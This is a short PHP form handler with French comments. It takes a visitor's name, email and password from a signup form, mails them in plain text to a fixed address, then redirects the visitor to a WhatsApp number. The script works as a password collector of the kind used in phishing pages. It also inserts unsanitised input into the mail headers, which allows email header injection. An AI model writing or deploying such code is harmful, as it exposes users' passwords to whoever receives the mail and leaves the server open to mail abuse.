<?php
// Récupération des données du formulaire
$nom = $_POST['nom'];
$email = $_POST['email'];
$password = $_POST['password'];

// Adresse email où envoyer le message
$destinataire = "adresse_email_destinataire@example.com";

// Sujet de l'email
$sujet = "Nouvelle inscription de $nom";

// Corps de l'email
$contenu = "Nom: $nom\n";
$contenu .= "Email: $email\n";
$contenu .= "Mot de passe: $password\n";

// En-têtes de l'email
$headers = "From: $email \r\n";
$headers .= "Reply-To: $email \r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

// Envoi de l'email
if (mail($destinataire, $sujet, $contenu, $headers)) {
    // Redirection vers un compte WhatsApp (exemple avec le numéro 1234567890)
    $whatsapp_number = "+22960012011"; // Remplacez ce numéro par le numéro WhatsApp réel
    header("Location: https://wa.me/$whatsapp_number");
    exit;
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
?>
